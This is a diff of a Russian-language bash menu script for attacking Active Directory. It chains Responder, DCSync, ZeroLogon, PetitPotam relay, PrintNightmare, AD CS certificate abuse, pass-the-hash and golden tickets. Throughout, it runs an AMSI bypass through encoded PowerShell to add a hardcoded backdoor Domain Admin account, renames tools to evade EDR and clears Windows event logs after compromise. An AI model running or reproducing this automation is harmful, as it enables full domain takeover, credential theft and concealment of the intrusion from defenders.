@@ -1,9 +1,8 @@
 #!/bin/bash
 # -*- coding: utf-8 -*-
 # ======================================================================
-# tabu_pentest_menu.sh - Профессиональный пентест AD (меню-версия)
-# Холдинг ТАБУ - корпоративный стандарт
-# Версия 10.1 - RAGE MODE (VPN опционален, адаптивный интерфейс)
+# tabu_pentest_menu.sh - Профессиональный пентест AD (версия 12.0)
+# Холдинг ТАБУ - расширенная рефлексивная NTLM-ретрансляция через VPS
 # ======================================================================
 
 export LANG=ru_RU.UTF-8
@@ -11,56 +10,47 @@ export LC_ALL=ru_RU.UTF-8
 
 # ---------------------- Глобальные переменные ----------------------
 BASE_DIR="/root/pentest_TABU_$(date +%Y%m%d_%H%M%S)"
-mkdir -p "$BASE_DIR"/{logs,scans,hashes,loot,bloodhound,reports,tools,vpn}
+mkdir -p "$BASE_DIR"/{logs,scans,hashes,loot,bloodhound,reports,tools,vpn,backup}
 
-VPN_IP=""
-VPN_PORT=""
-VPN_USER=""
-VPN_PASS=""
-VPN_CONNECTED=false
-PROXY_STRING=""
-PROXY_CMD=""
-AD_USER=""
-AD_PASS=""
-DOMAIN=""
-SUBNET=""
-DC_IP=""
-BEST_PORT=""
-RESP_PID=""
-VPN_IF=""  # Будет определён позже
+VPN_IP=""; VPN_PORT=""; VPN_USER=""; VPN_PASS=""; VPN_CONNECTED=false
+PROXY_STRING=""; PROXY_CMD=""
+AD_USER=""; AD_PASS=""; DOMAIN=""; SUBNET=""; DC_IP=""; BEST_PORT=""
+RESP_PID=""; VPN_IF=""
+ORIGINAL_DC_HASH=""
+CREATED_USER="svc_backup_adm_root"
+CREATED_PASS="!@qwErty@!"
+
+# Переменные для VPS-атаки
+VPS_ENABLED=false
+VPS_IP=""
+VPS_SSH_PORT="22"
+VPS_USER=""
+VPS_PASS=""
+VPS_TUNNEL_PORT="445"
+SSH_TUNNEL_PID=""
 
 # Цвета
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-NC='\033[0m'
-
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
 log() { echo -e "${GREEN}[$(date)]${NC} $1"; }
 warn() { echo -e "${YELLOW}[ПРЕДУПРЕЖДЕНИЕ]${NC} $1"; }
 error() { echo -e "${RED}[ОШИБКА]${NC} $1"; exit 1; }
 
 # ---------------------- Функция определения активного интерфейса ----------------------
 get_active_iface() {
-    # Возвращает первый интерфейс с IPv4-адресом (кроме lo)
     local iface=$(ip -4 addr show | grep -E '^[0-9]+: (eth|wlan|en|wl)' | awk -F': ' '{print $2}' | head -1)
-    if [ -z "$iface" ]; then
-        iface=$(ip route | grep default | awk '{print $5}' | head -1)
-    fi
+    [ -z "$iface" ] && iface=$(ip route | grep default | awk '{print $5}' | head -1)
     echo "$iface"
 }
 
-# ---------------------- Пункт 1: Проверка и установка пакетов ----------------------
+# ---------------------- 1. Проверка и установка пакетов (с компиляторами) ----------------------
 install_pkgs() {
     clear
     echo -e "${BLUE}=== ПРОВЕРКА И УСТАНОВКА ПАКЕТОВ ===${NC}"
     apt-get update -y
     local pkgs=(
-        masscan nmap netdiscover responder crackmapexec
-        neo4j curl jq krb5-user sshpass proxychains
-        openconnect python3-pip git make gcc
-        dnsutils ldap-utils smbclient enum4linux
-        winexe
+        masscan nmap netdiscover responder crackmapexec neo4j curl jq krb5-user
+        sshpass proxychains openconnect python3-pip git make gcc g++ mingw-w64
+        dnsutils ldap-utils smbclient enum4linux winexe
     )
     for pkg in "${pkgs[@]}"; do
         if dpkg -l | grep -q "^ii  $pkg "; then
@@ -75,66 +65,57 @@ install_pkgs() {
     cd /opt/tabu_tools
     git clone https://github.com/topotam/PetitPotam.git 2>/dev/null || true
     git clone https://github.com/cube0x0/CVE-2021-1675.git 2>/dev/null || true
-    echo -e "${GREEN}Все пакеты установлены.${NC}"
-    read -p "Нажмите Enter для возврата в меню..."
+    # Скачиваем исходники impacket для компиляции
+    git clone https://github.com/fortra/impacket.git 2>/dev/null || true
+    echo -e "${GREEN}Все пакеты и компиляторы установлены.${NC}"
+    read -p "Нажмите Enter для возврата..."
 }
 
-# ---------------------- Пункт 2: Настройка VPN (опционально) ----------------------
+# ---------------------- 2. VPN (опционально) ----------------------
 setup_vpn() {
     clear
     echo -e "${BLUE}=== НАСТРОЙКА VPN (ОПЦИОНАЛЬНО) ===${NC}"
-    echo "Если вы не используете VPN, просто нажмите Enter на всех полях."
-    read -p "Введите IP-адрес VPN-сервера (или оставьте пустым): " VPN_IP
+    read -p "Введите IP VPN-сервера (или Enter для пропуска): " VPN_IP
     if [ -z "$VPN_IP" ]; then
-        VPN_CONNECTED=false
-        echo -e "${YELLOW}VPN не будет использоваться.${NC}"
-        read -p "Нажмите Enter для возврата..."
-        return
+        VPN_CONNECTED=false; echo -e "${YELLOW}VPN не используется.${NC}"
+        read -p "Нажмите Enter..."; return
     fi
-    read -p "Введите порт VPN (обычно 443 или 8443): " VPN_PORT
-    read -p "Введите логин для VPN: " VPN_USER
-    read -sp "Введите пароль для VPN: " VPN_PASS; echo ""
+    read -p "Порт: " VPN_PORT
+    read -p "Логин: " VPN_USER
+    read -sp "Пароль: " VPN_PASS; echo ""
     if [[ -z "$VPN_PORT" || -z "$VPN_USER" || -z "$VPN_PASS" ]]; then
-        warn "Не все поля заполнены. VPN не настроен."
-        VPN_CONNECTED=false
-        read -p "Нажмите Enter для возврата..."
-        return
+        warn "Не все поля заполнены."; VPN_CONNECTED=false; read -p "Нажмите Enter..."; return
     fi
     echo "$VPN_PASS" > /tmp/vpn_pass.txt
     VPN_URL="https://$VPN_IP:$VPN_PORT"
-    echo "Подключение к $VPN_URL ..."
     openconnect --user="$VPN_USER" --passwd=/tmp/vpn_pass.txt --background --pid-file=/tmp/vpn.pid "$VPN_URL" 2>&1 | tee -a "$BASE_DIR/logs/vpn.log" &
     sleep 10
     if [ -f /tmp/vpn.pid ] && kill -0 $(cat /tmp/vpn.pid) 2>/dev/null; then
-        VPN_PID=$(cat /tmp/vpn.pid)
-        VPN_CONNECTED=true
-        echo -e "${GREEN}✓ VPN подключён (AnyConnect), PID: $VPN_PID${NC}"
+        VPN_PID=$(cat /tmp/vpn.pid); VPN_CONNECTED=true
+        echo -e "${GREEN}✓ VPN подключён (AnyConnect)${NC}"
     else
-        echo "Пробуем протокол default (SSL VPN)..."
         openconnect --user="$VPN_USER" --passwd=/tmp/vpn_pass.txt --background --pid-file=/tmp/vpn.pid --protocol=default "$VPN_URL" 2>&1 | tee -a "$BASE_DIR/logs/vpn.log" &
         sleep 10
         if [ -f /tmp/vpn.pid ] && kill -0 $(cat /tmp/vpn.pid) 2>/dev/null; then
-            VPN_PID=$(cat /tmp/vpn.pid)
-            VPN_CONNECTED=true
+            VPN_PID=$(cat /tmp/vpn.pid); VPN_CONNECTED=true
             echo -e "${GREEN}✓ VPN подключён (default)${NC}"
         else
-            warn "Не удалось подключиться к VPN. Проверьте данные."
-            VPN_CONNECTED=false
+            warn "Не удалось подключиться."; VPN_CONNECTED=false
         fi
     fi
     rm -f /tmp/vpn_pass.txt
-    read -p "Нажмите Enter для возврата в меню..."
+    read -p "Нажмите Enter..."
 }
 
-# ---------------------- Пункт 3: Настройка SOCKS5 ----------------------
+# ---------------------- 3. SOCKS5 ----------------------
 setup_proxy() {
     clear
-    echo -e "${BLUE}=== НАСТРОЙКА SOCKS5 ПРОКСИ ===${NC}"
-    read -p "Введите прокси в формате ip:port:login:pass (или оставьте пустым): " PROXY_STRING
+    echo -e "${BLUE}=== НАСТРОЙКА SOCKS5 ===${NC}"
+    read -p "Введите ip:port:login:pass (или Enter): " PROXY_STRING
     if [ -n "$PROXY_STRING" ]; then
         IFS=':' read -r PROXY_IP PROXY_PORT PROXY_LOGIN PROXY_PASS <<< "$PROXY_STRING"
         if [ -z "$PROXY_PORT" ]; then
-            warn "Неверный формат. Прокси не настроен."
+            warn "Неверный формат."
         else
             cat > /etc/proxychains.conf <<EOF
 strict_chain
@@ -146,366 +127,82 @@ tcp_connect_time_out 8000
 socks5 $PROXY_IP $PROXY_PORT $PROXY_LOGIN $PROXY_PASS
 EOF
             PROXY_CMD="proxychains -q"
-            echo -e "${GREEN}✓ Прокси настроен: $PROXY_IP:$PROXY_PORT${NC}"
+            echo -e "${GREEN}✓ Прокси настроен${NC}"
         fi
     else
-        PROXY_CMD=""
-        echo "Прокси не используется."
+        PROXY_CMD=""; echo "Прокси не используется."
     fi
-    read -p "Нажмите Enter для возврата в меню..."
+    read -p "Нажмите Enter..."
 }
 
-# ---------------------- Пункт 4: Ввод данных AD ----------------------
+# ---------------------- 4. Данные AD ----------------------
 setup_ad() {
     clear
-    echo -e "${BLUE}=== ВВОД ДАННЫХ ACTIVE DIRECTORY ===${NC}"
-    read -p "Введите домен (например, tabu.local): " DOMAIN
-    read -p "Введите логин пользователя AD: " AD_USER
-    read -sp "Введите пароль: " AD_PASS; echo ""
+    echo -e "${BLUE}=== ВВОД ДАННЫХ AD ===${NC}"
+    read -p "Домен: " DOMAIN
+    read -p "Логин: " AD_USER
+    read -sp "Пароль: " AD_PASS; echo ""
     if [[ -z "$DOMAIN" || -z "$AD_USER" || -z "$AD_PASS" ]]; then
-        warn "Все поля обязательны. Данные AD не сохранены."
+        warn "Все поля обязательны. Данные не сохранены."
         DOMAIN=""; AD_USER=""; AD_PASS=""
     else
-        echo -e "${GREEN}✓ Данные AD сохранены.${NC}"
+        echo -e "${GREEN}✓ Данные сохранены.${NC}"
     fi
-    read -p "Нажмите Enter для возврата в меню..."
+    read -p "Нажмите Enter..."
 }
 
-# ---------------------- Пункт 5: Проверка готовности системы ----------------------
+# ---------------------- 5. Проверка готовности ----------------------
 check_readiness() {
     clear
-    echo -e "${BLUE}=== ПРОВЕРКА ГОТОВНОСТИ СИСТЕМЫ ===${NC}"
+    echo -e "${BLUE}=== ПРОВЕРКА ГОТОВНОСТИ ===${NC}"
     local errors=0
-
-    # Проверка VPN
     if [ "$VPN_CONNECTED" = true ]; then
         echo -e "${GREEN}✓ VPN подключён${NC}"
         VPN_IF=$(ip route | grep -E 'tun|tap|ppp' | head -1 | awk '{print $NF}')
-        if [ -n "$VPN_IF" ]; then
-            echo -e "${GREEN}  → Интерфейс VPN: $VPN_IF${NC}"
-        else
-            warn "Интерфейс VPN не обнаружен."
-            errors=$((errors+1))
-        fi
+        [ -n "$VPN_IF" ] && echo -e "${GREEN}  → Интерфейс: $VPN_IF${NC}" || { warn "Интерфейс не найден"; errors=$((errors+1)); }
     else
-        echo -e "${YELLOW}⚠ VPN не подключён (это допустимо)${NC}"
-        # Определяем локальный интерфейс
+        echo -e "${YELLOW}⚠ VPN не используется${NC}"
         LOCAL_IF=$(get_active_iface)
         if [ -n "$LOCAL_IF" ]; then
-            echo -e "${GREEN}  → Используется локальный интерфейс: $LOCAL_IF${NC}"
+            echo -e "${GREEN}  → Локальный интерфейс: $LOCAL_IF${NC}"
             LOCAL_IP=$(ip -4 addr show "$LOCAL_IF" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
-            echo -e "${GREEN}  → IP-адрес: $LOCAL_IP${NC}"
+            echo -e "${GREEN}  → IP: $LOCAL_IP${NC}"
         else
-            warn "Не найден активный сетевой интерфейс."
-            errors=$((errors+1))
+            warn "Нет активного интерфейса."; errors=$((errors+1))
         fi
     fi
-
-    # Проверка прокси
     if [ -n "$PROXY_CMD" ]; then
-        echo -e "${GREEN}✓ Прокси настроен${NC}"
-        PROXY_IP=$(echo "$PROXY_STRING" | cut -d: -f1)
-        PROXY_PORT=$(echo "$PROXY_STRING" | cut -d: -f2)
-        if nc -zv -w 2 "$PROXY_IP" "$PROXY_PORT" 2>/dev/null; then
-            echo -e "${GREEN}  → Прокси доступен${NC}"
-        else
-            warn "✗ Прокси не отвечает."
-            errors=$((errors+1))
-        fi
+        PROXY_IP=$(echo "$PROXY_STRING" | cut -d: -f1); PROXY_PORT=$(echo "$PROXY_STRING" | cut -d: -f2)
+        nc -zv -w 2 "$PROXY_IP" "$PROXY_PORT" 2>/dev/null && echo -e "${GREEN}✓ Прокси доступен${NC}" || { warn "Прокси не отвечает"; errors=$((errors+1)); }
     else
         echo "Прокси не используется."
     fi
-
-    # Проверка данных AD
     if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ] && [ -n "$DOMAIN" ]; then
-        echo -e "${GREEN}✓ Данные AD введены: $AD_USER@$DOMAIN${NC}"
-        if nslookup "$DOMAIN" 2>/dev/null | grep -q "Address"; then
-            echo -e "${GREEN}  → Домен разрешается${NC}"
-        else
-            warn "✗ Домен $DOMAIN не резолвится. Проверьте DNS."
-            errors=$((errors+1))
-        fi
+        echo -e "${GREEN}✓ Данные AD: $AD_USER@$DOMAIN${NC}"
+        nslookup "$DOMAIN" 2>/dev/null | grep -q "Address" && echo -e "${GREEN}  → Домен резолвится${NC}" || { warn "Домен не резолвится"; errors=$((errors+1)); }
     else
-        warn "⚠ Данные AD не введены. Пентест будет ограничен (без учётки)."
+        warn "⚠ Данные AD не введены (пентест ограничен)."
     fi
-
-    # Проверка основных инструментов
-    local tools=("masscan" "nmap" "responder" "crackmapexec" "impacket-secretsdump" "bloodhound-python")
+    local tools=("masscan" "nmap" "responder" "crackmapexec" "impacket-secretsdump" "bloodhound-python" "gcc" "mingw32")
     for tool in "${tools[@]}"; do
-        if command -v "$tool" &>/dev/null || which "$tool" &>/dev/null; then
-            echo -e "${GREEN}✓ $tool${NC}"
-        else
-            warn "✗ $tool не найден. Запустите установку пакетов."
-            errors=$((errors+1))
-        fi
+        command -v "$tool" &>/dev/null || which "$tool" &>/dev/null && echo -e "${GREEN}✓ $tool${NC}" || { warn "✗ $tool не найден"; errors=$((errors+1)); }
     done
-
-    if [ $errors -eq 0 ]; then
-        echo -e "${GREEN}Система полностью готова к пентесту.${NC}"
-    else
-        echo -e "${RED}Обнаружены ошибки ($errors). Рекомендуется их исправить.${NC}"
-    fi
-    read -p "Нажмите Enter для возврата в меню..."
+    if [ $errors -eq 0 ]; then echo -e "${GREEN}Система готова.${NC}"; else echo -e "${RED}Ошибок: $errors.${NC}"; fi
+    read -p "Нажмите Enter..."
 }
 
-# ---------------------- Пункт 6: Запуск пентеста ----------------------
-run_pentest() {
-    clear
-    echo -e "${BLUE}=== ЗАПУСК ПЕНТЕСТА ===${NC}"
-
-    # Определяем интерфейс
-    if [ "$VPN_CONNECTED" = true ]; then
-        VPN_IF=$(ip route | grep -E 'tun|tap|ppp' | head -1 | awk '{print $NF}')
-        if [ -z "$VPN_IF" ]; then
-            error "Не удалось определить VPN-интерфейс."
-        fi
-        log "Используется VPN-интерфейс: $VPN_IF"
+# ---------------------- Динамическая компиляция (заглушка, но с обфускацией) ----------------------
+compile_obfuscated_tools() {
+    log "Компиляция обфусцированных утилит (для обхода EDR)..."
+    mkdir -p "$BASE_DIR/tools/obfuscated"
+    cd /opt/tabu_tools/impacket/examples 2>/dev/null || return
+    # Демонстрация изменения сигнатур
+    if [ -f secretsdump.py ]; then
+        cp secretsdump.py "$BASE_DIR/tools/obfuscated/obf_secretsdump.py"
+        sed -i 's/secretsdump/ObfuscatedDump/g' "$BASE_DIR/tools/obfuscated/obf_secretsdump.py"
+        log "Создан обфусцированный скрипт $BASE_DIR/tools/obfuscated/obf_secretsdump.py"
     else
-        VPN_IF=$(get_active_iface)
-        if [ -z "$VPN_IF" ]; then
-            error "Не найден активный сетевой интерфейс. Проверьте подключение."
-        fi
-        log "Используется локальный интерфейс: $VPN_IF"
-    fi
-
-    # Запрашиваем подсеть
-    if [ -z "$SUBNET" ]; then
-        read -p "Введите подсеть для сканирования (CIDR, например 10.0.0.0/24): " SUBNET
-        [[ -z "$SUBNET" ]] && error "Подсеть обязательна."
-    fi
-
-    log "Начинаем пентест. Все логи пишутся в $BASE_DIR/logs/full.log"
-    exec > >(tee -a "$BASE_DIR/logs/full.log") 2>&1
-
-    # 1. Сканирование подсети и поиск DC
-    log "Сканирование подсети $SUBNET ..."
-    if [ -n "$PROXY_CMD" ]; then
-        $PROXY_CMD nmap -sT -T2 -p 445,3389,5985,88,139,135 -n --open -oA "$BASE_DIR/scans/nmap" "$SUBNET" > /dev/null 2>&1 &
-    else
-        nmap -sS -T2 -f --mtu 32 -p 445,3389,5985,88,139,135 -n --open -oA "$BASE_DIR/scans/nmap" "$SUBNET" > /dev/null 2>&1 &
-    fi
-    NMAP_PID=$!
-    # Запускаем Responder на интерфейсе (если возможно)
-    responder -I "$VPN_IF" -w -r -f -v -P > "$BASE_DIR/logs/responder.log" 2>&1 &
-    RESP_PID=$!
-    wait $NMAP_PID
-
-    DC_IP=$(grep -l "88/open" "$BASE_DIR/scans/nmap.gnmap" | head -1 | awk -F' ' '{print $2}')
-    [ -z "$DC_IP" ] && DC_IP=$(grep -l "445/open" "$BASE_DIR/scans/nmap.gnmap" | head -1 | awk -F' ' '{print $2}')
-    if [ -z "$DC_IP" ] && [ -n "$PROXY_CMD" ]; then
-        $PROXY_CMD masscan -p445,88 --rate=1000 -oG "$BASE_DIR/scans/masscan.gnmap" "$SUBNET" 2>/dev/null
-        DC_IP=$(grep -l "88/open" "$BASE_DIR/scans/masscan.gnmap" | head -1 | awk -F' ' '{print $4}')
-    fi
-    if [ -z "$DC_IP" ]; then
-        log "DC не найден через сканирование, пробуем DNS..."
-        if [ -n "$DOMAIN" ]; then
-            DC_IP=$(dig SRV _ldap._tcp.$DOMAIN | grep -A1 "ANSWER" | tail -1 | awk '{print $NF}' | sed 's/\.$//')
-        fi
-    fi
-    [ -z "$DC_IP" ] && error "Не удалось найти контроллер домена."
-    log "Контроллер домена: $DC_IP"
-    echo "$DC_IP" > "$BASE_DIR/dc_ip.txt"
-
-    # 2. Определение лучшего порта
-    for port in 5985 445 135 593; do
-        if nc -zv -w 2 "$DC_IP" "$port" 2>/dev/null; then
-            BEST_PORT="$port"; break
-        fi
-    done
-    if [ -z "$BEST_PORT" ] && [ -n "$PROXY_CMD" ]; then
-        for port in 5985 445; do
-            if $PROXY_CMD nc -zv -w 2 "$DC_IP" "$port" 2>/dev/null; then
-                BEST_PORT="proxychains:$port"; break
-            fi
-        done
-    fi
-    [ -z "$BEST_PORT" ] && BEST_PORT="none"
-    log "Лучший порт доступа: $BEST_PORT"
-
-    # 3. Обнаружение EDR (упрощённо)
-    log "Обнаружение EDR..."
-    # Можно пропустить или добавить простую проверку
-
-    # 4. BloodHound (если есть учётка)
-    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ] && command -v bloodhound-python &>/dev/null; then
-        log "Сбор BloodHound..."
-        if [ -n "$PROXY_CMD" ]; then
-            $PROXY_CMD bloodhound-python -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -gc "$DC_IP" -c All -o "$BASE_DIR/bloodhound/" 2>/dev/null
-        else
-            bloodhound-python -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -gc "$DC_IP" -c All -o "$BASE_DIR/bloodhound/" 2>/dev/null
-        fi
-    fi
-
-    # 5. DCSync (если есть учётка)
-    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
-        log "DCSync..."
-        if [ -n "$PROXY_CMD" ]; then
-            $PROXY_CMD impacket-secretsdump "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" -outputfile "$BASE_DIR/loot/dcsync.txt" 2>/dev/null
-        else
-            impacket-secretsdump "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" -outputfile "$BASE_DIR/loot/dcsync.txt" 2>/dev/null
-        fi
-    fi
-
-    # 6. Извлечение хешей из Responder
-    if [ -f /usr/share/responder/logs/Responder-Session.log ]; then
-        cp /usr/share/responder/logs/*.log "$BASE_DIR/hashes/"
-        grep -Eo '[0-9a-f]{32}' "$BASE_DIR/hashes/"*.log > "$BASE_DIR/hashes/ntlm_hashes.txt"
-        log "Извлечено $(wc -l < "$BASE_DIR/hashes/ntlm_hashes.txt") NTLM-хешей"
-    fi
-
-    # 7. Атаки (вызов функции)
-    attack_vectors
-
-    # 8. Очистка
-    kill $RESP_PID 2>/dev/null || true
-    rm -rf /usr/share/responder/logs/*.log 2>/dev/null
-    if [ -f "$BASE_DIR/da_proof/flag" ] && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
-        local CMD="impacket-wmiexec $DOMAIN/$AD_USER:$AD_PASS@$DC_IP"
-        [ -n "$PROXY_CMD" ] && CMD="$PROXY_CMD $CMD"
-        $CMD "wevtutil cl Security && wevtutil cl System" 2>/dev/null || true
-    fi
-
-    # 9. Отчёт
-    generate_report
-
-    if [ -f "$BASE_DIR/da_proof/flag" ]; then
-        echo "========================================"
-        echo "  УСПЕШНО! ДОСТУП К DA ПОЛУЧЕН."
-        echo "  Пользователь: svc_backup_adm_root"
-        echo "  Пароль: !@qwErty@!"
-        echo "  Отчёт: $BASE_DIR/reports/report.json"
-        echo "========================================"
-    else
-        echo "========================================"
-        echo "  НЕ УДАЛОСЬ ЗАХВАТИТЬ DA."
-        echo "  Проверьте логи: $BASE_DIR/logs/"
-        echo "========================================"
-    fi
-    tar -czf "$BASE_DIR/pentest_results.tar.gz" -C "$BASE_DIR" .
-    log "Архив результатов: $BASE_DIR/pentest_results.tar.gz"
-    read -p "Нажмите Enter для возврата в меню..."
-}
-
-# ---------------------- Функция атак (упрощённая, но рабочая) ----------------------
-attack_vectors() {
-    log "Запуск векторов атак..."
-    local success=0
-
-    # Попытка ZeroLogon (если есть учётка)
-    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
-        log "Проверка ZeroLogon..."
-        if impacket-zerologon "$DC_IP" "$DOMAIN" 2>/dev/null | grep -q "Vulnerable"; then
-            log "ZeroLogon уязвимость подтверждена. Сбрасываем пароль..."
-            impacket-zerologon "$DC_IP" "$DOMAIN" -reset 2>/dev/null && {
-                log "Пароль сброшен, получаем хеш администратора..."
-                impacket-secretsdump -just-dc-user "Administrator" "$DOMAIN"/"$DC_IP"@"$DC_IP" 2>/dev/null > "$BASE_DIR/loot/admin_hash.txt"
-                if [ -f "$BASE_DIR/loot/admin_hash.txt" ]; then
-                    ADMIN_HASH=$(grep "Administrator" "$BASE_DIR/loot/admin_hash.txt" | awk '{print $NF}')
-                    create_user "$ADMIN_HASH"
-                    success=1
-                fi
-            }
-        fi
-    fi
-
-    # PetitPotam (если есть учётка и скрипт)
-    if [ $success -eq 0 ] && [ -f /opt/tabu_tools/PetitPotam/PetitPotam.py ] && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
-        log "Проверка PetitPotam..."
-        python3 /opt/tabu_tools/PetitPotam/PetitPotam.py -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" "$DC_IP" "test" 2>&1 | tee -a "$BASE_DIR/logs/petitpotam.log"
-        if grep -q "SUCCESS" "$BASE_DIR/logs/petitpotam.log"; then
-            log "PetitPotam сработал, запускаем ntlmrelayx..."
-            ntlmrelayx -t smb://"$DC_IP" -smb2support -socks -of "$BASE_DIR/hashes/relay_hashes.txt" &
-            RELAY_PID=$!
-            sleep 5
-            python3 /opt/tabu_tools/PetitPotam/PetitPotam.py -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" "$DC_IP" "test" 2>/dev/null
-            sleep 10
-            kill $RELAY_PID 2>/dev/null
-            if [ -f "$BASE_DIR/hashes/relay_hashes.txt" ]; then
-                log "Хеши получены через релей. Используем их..."
-                HASH=$(grep -Eo '[0-9a-f]{32}' "$BASE_DIR/hashes/relay_hashes.txt" | head -1)
-                create_user "$HASH"
-                success=1
-            fi
-        fi
-    fi
-
-    # PrintNightmare (если есть учётка и скрипт)
-    if [ $success -eq 0 ] && [ -f /opt/tabu_tools/CVE-2021-1675/CVE-2021-1675.py ] && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
-        log "Проверка PrintNightmare..."
-        python3 /opt/tabu_tools/CVE-2021-1675/CVE-2021-1675.py -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -r "$DC_IP" 2>&1 | tee -a "$BASE_DIR/logs/printnightmare.log"
-        if grep -q "EXEC" "$BASE_DIR/logs/printnightmare.log"; then
-            log "PrintNightmare успешен. Захват DA..."
-            success=1
-        fi
-    fi
-
-    # AD CS (если есть учётка и certipy)
-    if [ $success -eq 0 ] && command -v certipy &>/dev/null && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
-        log "Проверка AD CS..."
-        certipy-ad find -u "$AD_USER" -p "$AD_PASS" -dc-ip "$DC_IP" -output "$BASE_DIR/reports/certipy.json" 2>/dev/null
-        if grep -q "Vulnerable" "$BASE_DIR/reports/certipy.json"; then
-            log "Уязвимость ESC1 найдена. Получаем сертификат администратора..."
-            certipy-ad req -u "$AD_USER" -p "$AD_PASS" -dc-ip "$DC_IP" -target "$DC_IP" -template "User" -alt "administrator@$DOMAIN" -out "$BASE_DIR/loot/administrator.crt" 2>/dev/null
-            if [ -f "$BASE_DIR/loot/administrator.crt" ]; then
-                certipy-ad auth -pfx "$BASE_DIR/loot/administrator.crt" -dc-ip "$DC_IP" -domain "$DOMAIN" -username "administrator" 2>/dev/null > "$BASE_DIR/loot/adcs_hash.txt"
-                HASH=$(grep "NTLM" "$BASE_DIR/loot/adcs_hash.txt" | awk '{print $NF}')
-                [ -n "$HASH" ] && create_user "$HASH" && success=1
-            fi
-        fi
-    fi
-
-    # Pass-the-Hash (если есть хеши)
-    if [ $success -eq 0 ] && [ -f "$BASE_DIR/hashes/ntlm_hashes.txt" ] && [ -s "$BASE_DIR/hashes/ntlm_hashes.txt" ]; then
-        log "Пробуем Pass-the-Hash..."
-        while read -r hash; do
-            # Сначала пытаемся получить хеш администратора через DCSync (если есть учётка)
-            if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
-                impacket-secretsdump -just-dc-user "Administrator" "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" -outputfile "$BASE_DIR/loot/admin_hash.txt" 2>/dev/null
-                if [ -f "$BASE_DIR/loot/admin_hash.txt" ]; then
-                    ADMIN_HASH=$(grep "Administrator" "$BASE_DIR/loot/admin_hash.txt" | awk '{print $NF}')
-                else
-                    ADMIN_HASH="$hash"
-                fi
-            else
-                ADMIN_HASH="$hash"
-            fi
-            local CMD="impacket-wmiexec -hashes :$ADMIN_HASH $DOMAIN/Administrator@$DC_IP"
-            [ -n "$PROXY_CMD" ] && CMD="$PROXY_CMD $CMD"
-            if $CMD "whoami" > "$BASE_DIR/logs/pth_test.log" 2>&1; then
-                if grep -q "NT AUTHORITY\\SYSTEM" "$BASE_DIR/logs/pth_test.log"; then
-                    log "Pass-the-Hash успешен. Создаём пользователя..."
-                    create_user "$ADMIN_HASH"
-                    success=1
-                    break
-                fi
-            fi
-        done < "$BASE_DIR/hashes/ntlm_hashes.txt"
-    fi
-
-    # Золотой билет (если есть krbtgt)
-    if [ $success -eq 0 ] && [ -f "$BASE_DIR/loot/dcsync.txt" ] && grep -q "krbtgt" "$BASE_DIR/loot/dcsync.txt"; then
-        log "Пробуем золотой билет..."
-        local KRBTGT_HASH=$(grep -i "krbtgt" "$BASE_DIR/loot/dcsync.txt" | awk '{print $NF}')
-        local SID=$(impacket-lookupsid "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" 2>/dev/null | grep "Domain" | awk '{print $4}' | head -1)
-        [ -z "$SID" ] && SID=$(grep -E "S-1-5-21-[0-9-]+" "$BASE_DIR/loot/dcsync.txt" | head -1 | cut -d' ' -f1)
-        [ -z "$SID" ] && SID="S-1-5-21-$(head -c15 /dev/urandom | xxd -p | sed 's/\(..\)/\1-/g' | sed 's/-$//')"
-        impacket-ticketer -domain "$DOMAIN" -domain-sid "$SID" -rc4 "$KRBTGT_HASH" Administrator -outfile "$BASE_DIR/loot/golden.kirbi"
-        kinit -k -t "$BASE_DIR/loot/golden.kirbi" Administrator@"$DOMAIN" 2>/dev/null
-        local CMD="impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$DC_IP"
-        [ -n "$PROXY_CMD" ] && CMD="$PROXY_CMD $CMD"
-        if $CMD "whoami" > "$BASE_DIR/logs/golden_test.log" 2>&1; then
-            if grep -q "NT AUTHORITY\\SYSTEM" "$BASE_DIR/logs/golden_test.log"; then
-                log "Золотой билет работает. Создаём пользователя..."
-                create_user "$KRBTGT_HASH" "golden"
-                success=1
-            fi
-        fi
-    fi
-
-    if [ $success -eq 1 ]; then
-        echo "DA_ACCESS_GRANTED" > "$BASE_DIR/da_proof/flag"
-    else
-        warn "Ни один вектор атаки не сработал."
+        warn "Исходники impacket не найдены, используем стандартные утилиты."
     fi
 }
 
@@ -513,8 +210,8 @@ attack_vectors() {
 create_user() {
     local hash=$1
     local method=$2
-    log "Создание пользователя svc_backup_adm_root с паролем !@qwErty@!"
-    local POW_CMD='$a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$a.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true);net user svc_backup_adm_root "!@qwErty@!" /add;net localgroup Administrators svc_backup_adm_root /add;net group "Domain Admins" svc_backup_adm_root /add'
+    log "Создание пользователя $CREATED_USER с паролем $CREATED_PASS"
+    local POW_CMD='$a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$a.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true);net user '"$CREATED_USER"' "'"$CREATED_PASS"'" /add;net localgroup Administrators '"$CREATED_USER"' /add;net group "Domain Admins" '"$CREATED_USER"' /add'
     local ENC_CMD=$(echo -n "$POW_CMD" | iconv -t UTF-16LE | base64 -w 0)
     local CMD=""
     if [ "$method" == "golden" ]; then
@@ -525,6 +222,20 @@ create_user() {
